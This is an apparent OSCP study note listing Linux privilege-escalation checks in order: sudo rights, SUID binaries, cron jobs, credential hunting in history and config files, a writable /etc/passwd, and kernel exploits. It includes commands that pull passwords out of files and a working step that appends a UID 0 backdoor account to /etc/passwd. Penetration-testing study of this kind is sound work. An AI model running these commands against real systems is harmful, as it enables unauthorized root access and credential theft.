## Linux Priv Esc — Order of Operations

1. `sudo -l` — sudo permissions ← **always first**
2. SUID binaries
3. Cron jobs
4. Credential hunting
5. Writable `/etc/passwd`
6. Kernel exploits (last resort)

---

## 1. Sudo Abuse

> **In the event of:** You've just landed a shell as a low-privilege user and want to know if there's a fast, clean path to root — this is helpful because misconfigured sudo permissions are the most common privesc on OSCP boxes and require zero exploitation if present.

```bash
sudo -l
```
→ Shows which commands the current user can run as another user (usually root) without a password. Cross-reference every binary listed against **GTFOBins** to find a known abuse technique.
→ See [[04_Attack-Chains/sudo-gcore-privesc]] for the gcore memory dump chain.

---

## 2. SUID Binaries

> **In the event of:** You have no sudo rights and need another angle — this is helpful because a developer or admin may have left a standard binary (like `find`, `vim`, or `cp`) with the SUID bit set by accident, and any one of those can be abused to read or write files as root.

```bash
find / -perm -4000 -type f 2>/dev/null
```
→ Searches the entire filesystem for binaries with the SUID bit set, which causes them to execute with the file owner's privileges (often root) instead of the caller's. Every result is a potential privilege escalation — look each one up on **GTFOBins** for a known exploitation path.

---

## 3. Cron Jobs

> **In the event of:** Sudo and SUID come up empty — this is helpful because a root-owned cron job running a writable script is essentially a scheduled gift; you plant your payload, wait for the timer, and it executes as root without any further interaction.

```bash
cat /etc/crontab
```
→ Displays the system-wide cron schedule, showing tasks set to run automatically at specific times and the user they run as. If any script listed here is writable by you, you can inject commands that will execute as root when the job triggers.

```bash
ls -la /etc/cron.*
```
→ Lists all cron directories (hourly, daily, weekly, etc.) to surface additional scheduled jobs that may not appear in the main crontab. Check each script file's permissions — a world-writable cron script is an instant root path.

---

## 4. Credential Hunting

> **In the event of:** You're stuck as a low-privilege user with no obvious exploit path — this is helpful because a found password often lets you `su` to another user or directly to root, bypassing the need for any technical exploit entirely.

```bash
cat ~/.bash_history
```
→ Reads the shell history of the current user, which often reveals commands run with plaintext credentials or sensitive flags. Admins frequently type passwords directly into commands (e.g. `mysql -u root -pPassword123`) without realizing the history logs it.

```bash
find / -name "*.conf" -o -name "*.bak" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```
→ Searches the entire filesystem for config and backup files, then filters for any that contain the word "password". A single hit can expose database credentials, SSH keys, or app secrets that allow lateral movement or direct root access.

```bash
cat /var/www/html/config.php
```
→ Reads the web application's configuration file, which commonly stores database credentials in plaintext. These creds are often reused for system accounts, making this a reliable source for lateral movement or privilege escalation.

---

## 5. Writable /etc/passwd

> **In the event of:** You've found weak file permissions during enumeration — this is helpful because if `/etc/passwd` is writable, you can manufacture your own root account from scratch without needing any existing credentials or exploits.

```bash
ls -la /etc/passwd
```
→ Checks the permissions on the passwd file, which normally should only be writable by root. If you see write permissions for your user or group, you can inject a new root-level account directly.

```bash
openssl passwd -1 -salt hack password123
# append: hacker:<hash>:0:0:root:/root:/bin/bash
echo 'hacker:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```
→ `openssl passwd` generates a valid MD5-crypt hash that the passwd file format accepts — use this so you can log in with a known password. The appended entry sets UID and GID to `0`, which Linux treats as root regardless of the username, giving you a full root shell via `su hacker`.

---

## 6. Kernel Exploits

> **In the event of:** Everything else has failed and you're running an old or unpatched system — this is helpful because outdated kernels often have public CVEs with ready-made exploits, but treat this as a last resort since a bad kernel exploit can panic and crash the entire machine.

```bash
uname -a
```
→ Prints the full kernel version string, including the exact build number needed to match against known CVEs. Kernel exploits are a last resort — they are version-specific, noisy, and can crash the system if they fail.

```bash
searchsploit linux kernel <version>
```
→ Queries the local Exploit-DB database for known public exploits matching the kernel version. Once you find a match, transfer the exploit binary to the target and execute it to get root.

---

## Quick Checklist After Shell

Run this block immediately after landing a shell before doing anything else — covers the most common privesc paths in one pass.

```bash
whoami && id
sudo -l
uname -a
cat /etc/passwd
ps aux | grep root
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

---

## Related Notes

- [[Linux_Common_Commands]]
- [[Priv_Esc]]
